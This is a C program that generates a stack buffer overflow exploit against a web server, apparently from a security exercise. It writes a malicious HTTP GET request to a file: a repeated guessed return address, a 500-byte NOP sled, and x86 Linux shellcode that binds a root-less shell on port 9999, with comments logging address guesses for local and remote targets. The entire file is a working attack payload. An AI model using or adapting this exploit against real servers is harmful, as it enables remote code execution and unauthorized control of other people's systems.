
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

char filename[] = "output.dat";

/* 
	local server testing 3221221260 = 0xBFFFEF8C
		+100	bfffeff0
		-100	bfffef28
		+140
		-140
	remote server testing: 0xBFFFFFFF
		500 = 1f4
		-500 = bffffe0b
		-500 = bffffc17
		-500 = bffffa23
		-500 = bffff82f
	0xBFFFFFFF
		-
	73(dec) = 49(hex)
	500 (dec) = 1F4 (hex)
*/
int main (int argc, char *argv[]) {
	freopen(filename, "w", stdout);
	printf ("GET /");
	//return address
	for (int i = 0; i < 50; i++){
		printf("\x0b\xfe\xff\xbf");
	}
	//NOOP
	for (int i = 0; i < 500; i++){
		printf("\x90");
	}	
	//Shellcode ports: 9470 = 24FE, 9999 = 270F
	//Shellcode ports: 12357 = 3045


	printf("\x31\xdb\xf7\xe3\xb0\x66\x53\x43\x53\x43\x53\x89\xe1\x4b\xcd\x80\x89\xc7\x52\x66\x68\x27\x0f\x43\x66\x53\x89\xe1\xb0\xef\xf6\xd0\x50\x51\x57\x89\xe1\xb0\x66\xcd\x80\xb0\x66\x43\x43\xcd\x80\x50\x50\x57\x89\xe1\x43\xb0\x66\xcd\x80\x89\xd9\x89\xc3\xb0\x3f\x49\xcd\x80\x41\xe2\xf8\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x51\x53\x89\xe1\xb0\xf4\xf6\xd0\xcd\x80");
	printf (" HTTP");
	fclose(stdout);
	return 0;
}
